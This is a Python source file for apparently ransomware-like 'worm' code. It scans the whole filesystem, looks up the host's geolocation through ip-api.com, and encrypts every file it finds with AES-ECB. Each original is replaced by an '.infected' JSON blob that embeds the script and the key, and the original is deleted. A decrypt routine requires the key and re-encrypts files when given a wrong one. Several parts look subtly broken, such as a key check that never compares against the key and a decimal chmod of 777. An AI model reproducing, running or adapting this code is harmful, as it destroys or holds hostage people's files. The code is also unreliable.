import os
import sys
import time
import json
import socket
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Hash import SHA512
from Crypto.Util.Padding import pad, unpad
from dataclasses import dataclass, field, asdict

os.chmod(sys.argv[0], 777)
echo = open(sys.argv[0], 'rb').read()


@dataclass
class WormConfig:
    key: bytes = field(init=False)
    scan: str = field(default="C:\\" if sys.platform.startswith('win') else "/")
    ip_local: str = field(default=socket.gethostbyname(socket.gethostname()))
    ip_resolver: str = field(default="http://ip-api.com/json")
    def __repr__(self): return "<WormConfig %r>" % asdict(self)

    def __init__(self):
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".wormconfig"), "r") as conf:
            for line in conf.readlines():
                k, v = line.replace('\n', '').split(' ')
                if 'key' in k and 'default' not in v:
                    self.key = v
                elif 'scan' in k and 'default' not in v:
                    self.scan = v
                elif 'ip_local' in k and 'default' not in v:
                    self.ip_local = v
                elif 'ip_resolver' in k and 'default' not in v:
                    self.ip_resolver = v


@dataclass
class WormDigest:
    config: WormConfig = field(default=WormConfig)
    virus_data: bytes = field(default=echo)
    @staticmethod
    def ChecksumSHA512(data): return SHA512.new(data).hexdigest()

    def __init__(self):
        super(WormDigest, self).__init__()
        self.config = WormConfig()
        self.cipher = AES.new(
            self.config.key.encode() if isinstance(self.config.key, str) else self.config.key, AES.MODE_ECB
        )

    def EncodeAES(self, plaintext):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        padded = pad(plaintext, AES.block_size)
        enc = self.cipher.encrypt(padded)
        return base64.urlsafe_b64encode(enc).decode('utf-8')

    def DecodeAES(self, ciphertext):
        if isinstance(ciphertext, str):
            ciphertext = ciphertext.encode()
        enc = base64.urlsafe_b64decode(ciphertext)
        unpadded = self.cipher.decrypt(enc)
        return unpad(unpadded, AES.block_size).decode("utf-8")


@dataclass
class INET:
    public_ip: str = field(default=str)
    private_ip: str = field(default=str)
    bridges: list = field(default=list)
    last_refresh: float = field(init=False, default=float)
    def __repr__(self): return "<INET %r>" % asdict(self)
    def __init__(self): self.refresh()

    def refresh(self):
        self.private_ip = socket.gethostbyname(socket.gethostname())
        self.bridges = socket.gethostbyname_ex(socket.gethostname())[2]
        self.last_refresh = time.time()
        return self


@dataclass
class GeoIP:
    country: str = field(init=False)
    countryCode: str = field(init=False)
    region: str = field(init=False)
    regionName: str = field(init=False)
    city: str = field(init=False)
    zip: str = field(init=False)
    lat: float = field(init=False)
    lon: float = field(init=False)
    timezone: str = field(init=False)
    isp: str = field(init=False)
    AS: str = field(init=False)
    query: str = field(init=False)
    last_refresh: float = field(init=False, default=float)
    def __repr__(self): return "<GeoIP %r>" % asdict(self)
    def __init__(self): self.refresh()

    def refresh(self):
        data = requests.get('http://ip-api.com/json')
        for k, v in data.json().items():
            if k == 'as':
                self.AS = v
            else:
                setattr(self, k, v)
        self.last_refresh = time.time()
        return self


@dataclass
class Host:
    os_name: str = field(default=os.name)
    platform: str = field(default=sys.platform)
    id: str = field(init=False, default=str)
    last_refresh: float = field(init=False, default=float)
    geoip: GeoIP = field(default=GeoIP)
    inet: INET = field(default=INET)
    crypto: WormDigest = field(default=WormDigest)
    fs_scan_list: list = field(default=list)
    locked_file_list: list = field(default=list)
    def __repr__(self): return "<Host %r>" % asdict(self)
    def __init__(self): self.id = hex(id(self))

    def refresh(self):
        self.crypto = WormDigest()
        self.geoip = GeoIP()
        self.inet = INET()
        self.inet.public_ip = self.geoip.query
        self.os_name = os.name
        self.platform = sys.platform
        self.last_refresh = time.time()
        self.fs_scan_list = []
        for root, dirs, files in os.walk(self.crypto.config.scan):
            for file in files:
                self.fs_scan_list.append(os.path.join(root, file))
        return self

    def encrypt(self, key=None, delimiter="|:|", infected_tag=".infected"):
        if not key:
            cipher = self.crypto
        else:
            cipher = WormDigest()
            cipher.cipher = AES.new(key, AES.MODE_ECB)
        for filename in self.fs_scan_list:
            with open(filename, 'rb') as fin:
                data_read = fin.read()
                encrypted_data = {
                    "checksum": cipher.ChecksumSHA512(data_read),
                    "fileData": cipher.EncodeAES(data_read),
                    "encryptedVirus": cipher.EncodeAES(
                        cipher.EncodeAES(
                            time.time().hex().encode()
                        ) + delimiter + cipher.EncodeAES(cipher.virus_data)
                    ),
                    "iv": cipher.EncodeAES(cipher.EncodeAES(
                        time.time().hex().encode()
                    ) + delimiter + cipher.EncodeAES(cipher.config.key))
                }
            with open(filename + infected_tag, 'w') as fout:
                json.dump(encrypted_data, fout, indent=2)
                os.remove(filename)
        return self

    def decrypt(self, key, delimiter="|:|", clean_tag=".clean", infected_tag=".infected"):
        if not key:
            sys.stdout.write("\n[!] key was not provided [!]")
            sys.exit(0)
        wd = WormDigest()
        wd.cipher = AES.new(key, AES.MODE_ECB)
        if wd.EncodeAES(delimiter.encode()) != self.crypto.EncodeAES(delimiter.encode()):
            sys.stdout.write("\n[!] key is wrong , did not passed delimiter test [!]")
            sys.stdout.write("\n[DIGESTING]("+str(key)+","+str(hex(id(wd.cipher)))+")")
            self.encrypt(key, delimiter, infected_tag)
            sys.stdout.write("\n[ENCRYPTING] file was re-encrypted")
            sys.exit(1)

        if os.path.isdir(self.crypto.config.scan):
            for root, dirs, files in os.walk(self.crypto.config.scan):
                for name in files:
                    if infected_tag in name:
                        filename = os.path.join(root, name)
                        with open(filename, "rb") as fin:
                            encrypted_data = json.load(fin)
                        with open(filename + clean_tag, "w") as fout:
                            fout.write(wd.DecodeAES(encrypted_data["fileData"]))
                        os.remove(filename)
        else:
            with open(self.crypto.config.scan, 'rb') as fin:
                encrypted_data = json.load(fin)
                obj = {
                    "checksum": encrypted_data["checksum"],
                    "iv": [wd.DecodeAES(i) for i in
                           wd.DecodeAES(encrypted_data["iv"]).split(delimiter)],
                    "fileData": wd.DecodeAES(encrypted_data["fileData"]),
                    "decryptedVirus": [wd.DecodeAES(i) for i in
                                       wd.DecodeAES(encrypted_data["encryptedVirus"]).split(delimiter)]
                }
            with open(os.path.join(self.crypto.config.scan+clean_tag), "w") as fout:
                json.dump(obj, fout, indent=2)
            os.remove(self.crypto.config.scan)
            return obj


def run(args):
    host = Host()
    host.refresh()
    if args.encrypt:
        host.crypto.scan = args.encrypt
        sys.stdout.write("\n[ENCRYPTING]")
        host.encrypt()
        sys.exit(0)
    if args.decrypt and args.key:
        host.crypto.config.scan = args.decrypt
        sys.stdout.write("\n[DECRYPTING]")
        host.decrypt(args.key.encode())
        sys.exit(0)


if __name__ == "__main__":
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument("-e", "--encrypt", type=str, help="-e <FILE_PATH>")
    parser.add_argument("-d", "--decrypt", type=str, help="-d <FILE_PATH>")
    parser.add_argument("-k", "--key", type=str, help="-k <DECRYPTION_KEY>")
    args = parser.parse_args()
    run(args)